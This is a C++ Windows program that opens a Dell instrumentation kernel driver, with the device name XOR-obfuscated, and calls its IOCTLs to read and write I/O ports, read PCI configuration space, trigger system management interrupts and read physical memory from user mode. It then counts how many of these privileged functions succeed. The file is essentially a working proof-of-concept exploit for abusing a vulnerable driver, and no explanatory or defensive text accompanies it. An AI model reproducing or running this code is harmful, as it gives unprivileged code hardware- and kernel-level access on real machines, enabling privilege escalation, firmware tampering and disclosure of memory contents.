#define NOMINMAX
#include <Windows.h>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <vector>

enum : DWORD {
    kSetCookie  = 0x9B0C1FC4,
    kGetVersion = 0x9B0C1FC0,
    kBiosCmd    = 0x9B0C1F00,
    kPciRead    = 0x9B0C1F48,
    kPortWR     = 0x9B0C1F88,
    kPhysRead   = 0x9B0C1E48,
};

#pragma pack(push, 1)
struct CookieBuf  { uint64_t val; };
struct VersionBuf { uint32_t maj, min, rev; uint8_t locked, btype, _p[2]; };
struct PortBuf    { uint64_t ck; uint32_t sz; uint16_t p1, p2; uint32_t v1, v2; };
struct PciHdr     { uint64_t ck, bus, dev, fn, off; };
struct SmiBuf     { uint64_t ck, rax, rbx, rcx, rdx, rsi, rdi; uint32_t iosz, trig; uint8_t done, _p[7]; };
struct PhysHdr    { uint64_t ck, pa; };
#pragma pack(pop)
static_assert(sizeof(SmiBuf) == 72, "");

static HANDLE g_h;
static uint64_t g_ck;
static int g_hits;

static bool dio(DWORD code, void* buf, DWORD sz) {
    DWORD ret;
    return DeviceIoControl(g_h, code, buf, sz, buf, sz, &ret, NULL);
}

static bool init() {
    // \\.\ Dell_Instrumentation  ^0x37
    uint8_t e[] = {
        0x6B,0x6B,0x19,0x6B, 0x73,0x52,0x5B,0x5B,0x68,0x7E,
        0x59,0x44,0x43,0x45, 0x42,0x5A,0x52,0x59,0x43,0x56,
        0x43,0x5E,0x58,0x59
    };
    char path[28] = {};
    for (int i = 0; i < 24; i++) path[i] = e[i] ^ 0x37;

    g_h = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (g_h == INVALID_HANDLE_VALUE) return false;

    g_ck = 0x44454C4C00000001ULL;
    CookieBuf cb = { g_ck };
    if (!dio(kSetCookie, &cb, sizeof(cb))) return false;

    VersionBuf vb = {};
    if (dio(kGetVersion, &vb, sizeof(vb)) && !vb.locked) {
        cb.val = g_ck;
        if (!dio(kSetCookie, &cb, sizeof(cb))) return false;
    }
    return true;
}

static bool wr_port(uint16_t wp, uint32_t wv, uint16_t rp, uint32_t sz, uint32_t& out) {
    PortBuf b = {}; b.ck = g_ck; b.sz = sz; b.p1 = wp; b.p2 = rp; b.v1 = wv;
    if (!dio(kPortWR, &b, sizeof(b))) return false;
    out = b.v2;
    return true;
}

static bool read_pci(uint32_t bus, uint32_t d, uint32_t f, uint32_t off, void* dst, uint32_t len) {
    size_t total = sizeof(PciHdr) + len;
    std::vector<uint8_t> buf(total, 0);
    auto* h = (PciHdr*)buf.data();
    h->ck = g_ck; h->bus = bus; h->dev = d; h->fn = f; h->off = off;
    if (!dio(kPciRead, buf.data(), (DWORD)total)) return false;
    memcpy(dst, buf.data() + sizeof(PciHdr), len);
    return true;
}

static bool trigger_smi(uint8_t magic, uint16_t cls, uint16_t sel, SmiBuf& out,
                        const void* in = NULL, uint32_t insz = 0,
                        void* pout = NULL, uint32_t outsz = 0) {
    uint32_t mx = insz > outsz ? insz : outsz;
    uint32_t total = sizeof(SmiBuf) + mx;
    std::vector<uint8_t> buf(total, 0);
    auto* s = (SmiBuf*)buf.data();
    s->ck = g_ck; s->rax = magic; s->rbx = ((uint32_t)cls << 16) | sel; s->trig = 1;
    if (in && insz) memcpy(buf.data() + 72, in, insz);
    if (!dio(kBiosCmd, buf.data(), total)) return false;
    memcpy(&out, buf.data(), sizeof(SmiBuf));
    if (pout && outsz) memcpy(pout, buf.data() + 72, outsz);
    return true;
}

static bool bios_noop(const void* in, uint32_t insz, void* out, uint32_t outsz) {
    uint32_t mx = insz > outsz ? insz : outsz;
    uint32_t total = sizeof(SmiBuf) + mx;
    std::vector<uint8_t> buf(total, 0);
    auto* s = (SmiBuf*)buf.data();
    s->ck = g_ck; s->trig = 0; s->iosz = 0;
    if (in && insz) memcpy(buf.data() + 72, in, insz);
    if (!dio(kBiosCmd, buf.data(), total)) return false;
    if (out && outsz) memcpy(out, buf.data() + 72, outsz);
    return true;
}

static bool read_phys(uint64_t addr, void* dst, uint32_t len) {
    size_t total = sizeof(PhysHdr) + len;
    std::vector<uint8_t> buf(total, 0);
    auto* h = (PhysHdr*)buf.data();
    h->ck = g_ck; h->pa = addr;
    if (!dio(kPhysRead, buf.data(), (DWORD)total)) return false;
    memcpy(dst, buf.data() + sizeof(PhysHdr), len);
    return true;
}

static void dump(const void* p, size_t n) {
    auto* b = (const uint8_t*)p;
    for (size_t i = 0; i < n; i += 16) {
        printf("    %04x:", (unsigned)i);
        size_t r = n - i; if (r > 16) r = 16;
        for (size_t j = 0; j < r; j++) printf(" %02x", b[i + j]);
        puts("");
    }
}

static void check_ports() {
    puts("\n[1] port i/o");
    uint8_t cmos[128] = {};
    for (int i = 0; i < 128; i++) {
        uint32_t v;
        if (wr_port(0x70, i & 0x7F, 0x71, 1, v)) cmos[i] = (uint8_t)v;
    }
    auto bcd = [](uint8_t v) -> int { return (v >> 4) * 10 + (v & 0xF); };
    printf("    rtc %02d:%02d:%02d  20%02d-%02d-%02d\n",
        bcd(cmos[4]), bcd(cmos[2]), bcd(cmos[0]),
        bcd(cmos[0x32]), bcd(cmos[8]), bcd(cmos[7]));
    dump(cmos, 64);
    g_hits++;
}

static void check_pci() {
    puts("\n[2] pci config");
    int cnt = 0;
    for (uint32_t d = 0; d < 32 && cnt < 6; d++) {
        for (uint32_t f = 0; f < 8; f++) {
            uint8_t cfg[64] = {};
            if (!read_pci(0, d, f, 0, cfg, 64)) continue;
            uint16_t vid = *(uint16_t*)cfg, did = *(uint16_t*)(cfg + 2);
            if (vid == 0xFFFF || !vid) continue;
            printf("    %02x:%02x.%u %04x:%04x %02x%02x\n",
                0, d, f, vid, did, cfg[0xB], cfg[0xA]);
            cnt++;
            if (!f && !(cfg[0xE] & 0x80)) break;
        }
    }
    if (cnt) g_hits++;
}

static void check_smi() {
    puts("\n[3] smi");
    SmiBuf r = {};
    uint8_t pl[256] = {}, rs[256] = {};
    if (trigger_smi(0xDA, 0, 0, r, pl, 256, rs, 256)) {
        printf("    rax=%llx rbx=%llx st=%04x\n",
            r.rax, r.rbx, (uint32_t)(r.rbx & 0xFFFF));
        g_hits++;
    } else {
        printf("    err %u\n", GetLastError());
    }
}

static void check_kbuf() {
    puts("\n[4] kernel buf");
    uint8_t tx[64], rx[64] = {};
    for (int i = 0; i < 64; i++) tx[i] = (uint8_t)(i * 7 + 3);
    if (bios_noop(tx, 64, rx, 64) && !memcmp(tx, rx, 64)) {
        puts("    64b roundtrip ok");
        g_hits++;
    }
}

static void check_physmem() {
    puts("\n[5] phys read");
    uint8_t buf[64] = {};
    if (read_phys(0xFED00000ULL, buf, 64)) {
        puts("    64b @ FED00000:");
        dump(buf, 64);
        g_hits++;
    } else {
        puts("    blocked (only intel cpu)");
    }
}

int main() {
    if (!init()) {
        printf("[-] err %u\n", GetLastError());
        return 1;
    }

    VersionBuf v = {};
    if (dio(kGetVersion, &v, sizeof(v)))
        printf("[+] v%u.%u.%u bios=%u\n", v.maj, v.min, v.rev, v.btype);

    check_ports();
    check_pci();
    check_smi();
    check_kbuf();
    check_physmem();

    printf("\n%d/5\n", g_hits);
    CloseHandle(g_h);
    return 0;
}
